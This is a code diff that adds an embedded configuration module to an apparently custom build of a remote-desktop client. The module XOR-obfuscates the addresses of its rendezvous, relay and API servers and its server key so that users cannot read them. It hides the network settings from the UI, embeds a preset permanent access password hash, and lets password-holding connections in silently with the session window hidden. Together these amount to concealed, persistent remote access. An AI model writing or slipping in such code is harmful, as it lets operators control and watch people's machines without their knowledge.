index 0000000..5f724dc
--- /dev/null
+++ b/src/embedded_config.rs
@@ -0,0 +1,104 @@
+// Self-hosted custom client defaults.
+//
+// Server settings are stored obfuscated (single-byte XOR) and injected into
+// `config::OVERWRITE_SETTINGS` at startup, so end users can neither read them
+// in the UI nor override them locally. Note that the values still exist inside
+// the binary by necessity; obfuscation only prevents casual string scanning.
+use hbb_common::config;
+
+// GitHub repository holding our public releases. The software update checker
+// queries its `releases/latest` API and downloads assets from it.
+pub const UPDATE_RELEASE_REPO_OWNER: &str = "kumu7y";
+pub const UPDATE_RELEASE_REPO_NAME: &str = "rustdesk-release";
+
+const OBFUSCATION_KEY: u8 = 0x5A;
+
+// (option key, obfuscated value)
+#[rustfmt::skip]
+const LOCKED_SERVER_OPTIONS: &[(&str, &[u8])] = &[
+    (
+        "custom-rendezvous-server",
+        &[0x28, 0x2f, 0x29, 0x2e, 0x3e, 0x3f, 0x29, 0x31, 0x74, 0x31, 0x2f, 0x37,
+          0x2f, 0x6d, 0x23, 0x74, 0x33, 0x39, 0x2f, 0x60, 0x68, 0x6b, 0x6b, 0x6b, 0x6c],
+    ),
+    (
+        "relay-server",
+        &[0x28, 0x2f, 0x29, 0x2e, 0x3e, 0x3f, 0x29, 0x31, 0x74, 0x31, 0x2f, 0x37,
+          0x2f, 0x6d, 0x23, 0x74, 0x33, 0x39, 0x2f, 0x60, 0x68, 0x6b, 0x6b, 0x6b, 0x6d],
+    ),
+    (
+        "api-server",
+        &[0x32, 0x2e, 0x2e, 0x2a, 0x29, 0x60, 0x75, 0x75, 0x28, 0x2f, 0x29, 0x2e,
+          0x3e, 0x3f, 0x29, 0x31, 0x74, 0x31, 0x2f, 0x37, 0x2f, 0x6d, 0x23, 0x74,
+          0x33, 0x39, 0x2f, 0x60, 0x62, 0x62, 0x62, 0x62],
+    ),
+    (
+        "key",
+        &[0x2e, 0x23, 0x0d, 0x6f, 0x00, 0x03, 0x3e, 0x30, 0x0f, 0x1c, 0x0c, 0x30,
+          0x11, 0x23, 0x69, 0x03, 0x35, 0x1e, 0x2e, 0x38, 0x3d, 0x17, 0x28, 0x6f,
+          0x36, 0x0d, 0x18, 0x62, 0x1c, 0x11, 0x1f, 0x6a, 0x62, 0x38, 0x29, 0x28,
+          0x35, 0x0a, 0x1c, 0x29, 0x33, 0x32, 0x1b, 0x67],
+    ),
+    // Unattended access: the explicit allow-hide switch. Approval mode is
+    // intentionally left at the upstream default (`both`), so connections
+    // with a valid password (embedded or temporary random) are accepted
+    // silently while unknown peers trigger a click-to-accept dialog (see
+    // `unattended_hide_cm()` consumed by ipc.rs).
+    ("allow-hide-cm", &[0x03]),
+];
+
+// Built-in UI gates (upstream custom-client mechanism): hide the whole
+// Network settings tab (ID/relay/API/key/proxy/websocket) so end users can
+// neither see nor reach the server configuration in the UI.
+const HIDDEN_UI_OPTIONS: &[&str] = &[
+    "hide-network-settings",
+    "hide-server-settings",
+    "hide-websocket-settings",
+];
+
+fn deobfuscate(data: &[u8]) -> String {
+    String::from_utf8(data.iter().map(|b| b ^ OBFUSCATION_KEY).collect::<Vec<u8>>())
+        .unwrap_or_default()
+}
+
+/// Unattended-mode gate for `ipc.rs` `hide_cm`: the explicit allow-hide
+/// switch only. Approval mode stays at the upstream default (`both`): valid
+/// passwords (embedded or temporary random) connect silently, while unknown
+/// peers pop up a click-to-accept dialog which auto-restores the hidden
+/// window via the DialogManager hook.
+pub fn unattended_hide_cm() -> bool {
+    use hbb_common::config::{self, option2bool};
+    option2bool("allow-hide-cm", &config::Config::get_option("allow-hide-cm"))
+}
+
+// Preset permanent (unattended access) password, stored as
+// `HARD_SETTINGS["password"] = "00" + base64(SHA256(plain || salt))` and
+// `HARD_SETTINGS["salt"]`. The plaintext never exists in the binary: only the
+// salted hash is embedded, so it cannot be recovered from the installer.
+const PRESET_PASSWORD_STORAGE: &[u8] = &[
+    0x6a, 0x6a, 0x63, 0x03, 0x28, 0x13, 0x6e, 0x2e, 0x63, 0x3e, 0x3c, 0x35, 0x69, 0x2a, 0x20,
+    0x13, 0x1c, 0x2d, 0x33, 0x28, 0x35, 0x32, 0x15, 0x11, 0x08, 0x1d, 0x3f, 0x08, 0x68, 0x0e,
+    0x0d, 0x1f, 0x6d, 0x13, 0x02, 0x1c, 0x2a, 0x10, 0x2c, 0x3c, 0x19, 0x0b, 0x2d, 0x62, 0x0f,
+    0x67,
+];
+const PRESET_PASSWORD_SALT: &[u8] = &[
+    0x6d, 0x0f, 0x3e, 0x0e, 0x63, 0x6a, 0x16, 0x14, 0x29, 0x15, 0x1f, 0x33, 0x1d, 0x6f, 0x0f,
+    0x0e, 0x3b, 0x12, 0x75, 0x3c, 0x0e, 0x0b, 0x67, 0x67,
+];
+
+pub fn init() {
+    let mut settings = config::OVERWRITE_SETTINGS.write().unwrap();
+    for (k, v) in LOCKED_SERVER_OPTIONS {
+        settings.insert(k.to_string(), deobfuscate(v));
+    }
+    let mut builtin = config::BUILTIN_SETTINGS.write().unwrap();
+    for k in HIDDEN_UI_OPTIONS {
+        builtin.insert(k.to_string(), "Y".to_string());
+    }
+    let mut hard_settings = config::HARD_SETTINGS.write().unwrap();
+    hard_settings.insert(
+        "password".to_string(),
+        deobfuscate(PRESET_PASSWORD_STORAGE),
+    );
+    hard_settings.insert("salt".to_string(), deobfuscate(PRESET_PASSWORD_SALT));
+}
